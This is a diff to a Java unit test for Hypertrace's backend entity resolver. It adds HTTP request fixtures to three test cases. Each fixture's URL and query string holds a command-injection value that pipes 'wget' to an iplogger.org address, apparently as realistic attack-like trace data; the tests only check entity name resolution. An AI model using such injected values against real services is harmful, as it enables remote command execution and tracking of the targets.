@@ -15,6 +15,7 @@ import org.hypertrace.core.datamodel.EventRef;
 import org.hypertrace.core.datamodel.EventRefType;
 import org.hypertrace.core.datamodel.MetricValue;
 import org.hypertrace.core.datamodel.Metrics;
+import org.hypertrace.core.datamodel.eventfields.http.Request;
 import org.hypertrace.core.datamodel.shared.StructuredTraceGraph;
 import org.hypertrace.core.span.constants.v1.Grpc;
 import org.hypertrace.core.span.constants.v1.Http;
@@ -134,7 +135,16 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setUrl("http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
+                            .setHost("dataservice:9394")
+                            .setPath("/api/timelines")
+                            .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals("dataservice.mypastryshop.devcluster:9394", backendEntity.getEntityName());
@@ -181,7 +191,16 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+            .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                    .setRequest(Request.newBuilder()
+                            .setUrl("http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
+                            .setHost("dataservice:9394")
+                            .setPath("/api/timelines")
+                            .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
+                            .build())
+                    .build())
+            .build();
 
     final Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals("dataservice.mypastryshop.devcluster:9394", backendEntity.getEntityName());
@@ -287,7 +306,16 @@ public class BackendEntityResolverTest extends AbstractAttributeEnricherTest {
         .setEventRefList(Arrays.asList(
             EventRef.newBuilder().setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                 .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
-                .setRefType(EventRefType.CHILD_OF).build())).build();
+                .setRefType(EventRefType.CHILD_OF).build()))
+        .setHttp(org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
+                .setRequest(Request.newBuilder()
+                        .setUrl("http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
+                        .setHost("dataservice:9394")
+                        .setPath("/api/timelines")
+                        .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
+                        .build())
+                .build())
+        .build();
 
     Entity backendEntity = backendEntityResolver.resolveEntity(e, structuredTraceGraph).get();
     assertEquals("dataservice.mypastryshop.devcluster:9394", backendEntity.getEntityName());
